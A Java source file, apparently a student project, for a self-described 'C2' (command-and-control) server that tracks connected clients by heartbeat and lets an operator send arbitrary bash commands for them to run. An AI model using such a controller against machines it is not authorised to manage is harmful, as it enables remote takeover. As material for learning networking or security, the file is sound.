import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;


/**
 * Main C2 server component.
 *
 * The server is responsible for:
 * - Accepting incoming client connections
 * - Assigning each client a unique ID
 * - Spawning a separate ClientHandler thread for each client
 * - Providing a CLI interface for administrative commands
 *   (run, kill_client, show_clients_status, exit)
 * - Managing a heartbeat-monitoring thread that detects inactive clients
 *
 * The server runs continuously, handling admin commands and client activity
 * asynchronously, without blocking new connections.
 */

public class Server {

    /**
     * Main storage of connected clients.
     * Each client is represented by a ClientHandler and indexed by its assigned ID.
     * ConcurrentHashMap is used to support access from multiple threads.
     */
    public static Map<Integer, ClientHandler> clients = new ConcurrentHashMap<>();

    /**
     * Generates unique incremental client IDs in a thread-safe way.
     */
    public static AtomicInteger clientIdCreator = new AtomicInteger(1); // geekforgeeks
                                                                        // -https://www.geeksforgeeks.org/java/atomic-variables-in-java-with-examples/

    public static Thread heartbeatMonitor; // for interrupt between kill and heartbeat

    public static void main(String[] args) throws IOException {

        try (ServerSocket serverSocket = new ServerSocket(5000)) {
            System.out.println("Server running, enter commands:");
            System.out.println("1. show_clients_status            - Shows the status of all clients");
            System.out.println("2. kill_client <client_id>        - Kills the client with the specified ID");
            System.out.println(
                    "3. run <client_id> <bash command> - Executes a bash command on the client with the specified ID");
            System.out.println("4. exit                           - Quit the server");

            // Admin thread handles CLI commands asynchronously (e.g. "run", "kill", etc.)
            Thread adminThread = new Thread(() -> handleAdminCommands()); // admin commands (CLI)
            adminThread.start();

            // Heartbeat monitor:
            // Periodically checks last heartbeat timestamps from clients.
            // If a client hasn't reported in too long, it is considered dead.
            heartbeatMonitor = new Thread(() -> { // heartbeat thread
                try {
                    while (!Thread.currentThread().isInterrupted()) { // check for interrupt
                        long now = System.currentTimeMillis();
                        for (ClientHandler handler : clients.values()) {
                            if (now - handler.getLastHeartbeatTime() > 20000) {
                                System.out.println("Client " + handler.getId() + " timed out");
                                handler.kill();
                                clients.remove(handler.getId(), handler); // remove only if kill not remove already
                            }
                        }
                        Thread.sleep(5000);
                    }

                } catch (Exception e) {
                    System.out.println("Heartbeat monitor stopped");
                    Thread.currentThread().interrupt(); // preserve interrupt status
                }
            });
            heartbeatMonitor.start();

            // Main accept loop — accepts incoming clients and assigns them IDs
            while (true) {
                Socket clientSocket = serverSocket.accept();
                int currId = clientIdCreator.getAndIncrement();
                ClientHandler clientHandler = new ClientHandler(clientSocket, currId);
                clients.put(currId, clientHandler);
                new Thread(clientHandler).start();
                System.out.println("Client connected ID: " + currId);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    /**
     * Handles all admin-side commands typed into the server console.
     *
     * Supported commands:
     * - show_clients_status
     * - kill_client <id>
     * - run <id> <command>
     * - exit
     *
     * Commands run asynchronously so the server continues accepting clients.
     */
    public static void handleAdminCommands() {
        try {
            BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));
            while (true) {
                // admin commands
                String adminCommand = reader.readLine();
                if (adminCommand == null || adminCommand.trim().isEmpty())
                    continue;

                int firstSpace = adminCommand.indexOf(" ");
                String command = firstSpace == -1 ? adminCommand.toLowerCase()
                        : adminCommand.substring(0, firstSpace).toLowerCase();
                String params = firstSpace == -1 ? "" : adminCommand.substring(firstSpace + 1);

                switch (command) {
                    case "exit":
                        System.out.println("Exiting server");
                        heartbeatMonitor.interrupt();
                        for (ClientHandler handler : clients.values()) {
                            handler.sendCommand("kill");
                            handler.kill();
                        }
                        clients.clear();
                        System.exit(0);
                        break;

                    case "show_clients_status":
                        if (clients.isEmpty()) {
                            System.out.println("no clients exists");
                        } else {
                            for (Map.Entry<Integer, ClientHandler> entry : clients.entrySet()) { // stackoverflow -
                                                                                                 // https://stackoverflow.com/questions/1066589/iterate-through-a-hashmap
                                System.out.println(entry.getValue().toString());
                            }
                        }
                        break;

                    case "kill_client":
                        int id = Integer.parseInt(params.trim());
                        ClientHandler killHandler = clients.get(id);
                        if (killHandler != null) {
                            killHandler.sendCommand("kill");
                            killHandler.kill();
                            clients.remove(id);
                        } else {
                            System.out.println("Client not found");
                        }
                        break;

                    case "run":
                        int spaceIndex = params.indexOf(" ");
                        if (spaceIndex == -1) {
                            System.out.println("Missing parameters: <client_id> <command>");
                            return;
                        }
                        try {
                            int idRun = Integer.parseInt(params.substring(0, spaceIndex).trim());
                            String cmdToRun = params.substring(spaceIndex + 1).trim();
                            ClientHandler c = clients.get(idRun);
                            if (c != null && c.isAlive()) {
                                c.sendCommand(cmdToRun);
                            } else {
                                System.out.println("Client not found or dead");
                            }
                        } catch (Exception e) {
                            System.out.println("Invalid client ID");
                        }

                        break;

                    // step 1 - echho command
                    // case "echo":
                    // if (commandParts.length != 2) {
                    // System.out.println("invalid paramateres");
                    // }
                    // else {
                    // int id = Integer.parseInt(commandParts[1]);
                    // ClientHandler c = clients.get(id);
                    // if (c != null && c.isAlive()) {
                    // c.sendCommand("ECHO");
                    // } else {
                    // System.out.println("Client not found or dead");
                    // }

                    // }
                    // break;

                    default:
                        System.out.println("unknown command");
                        break;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
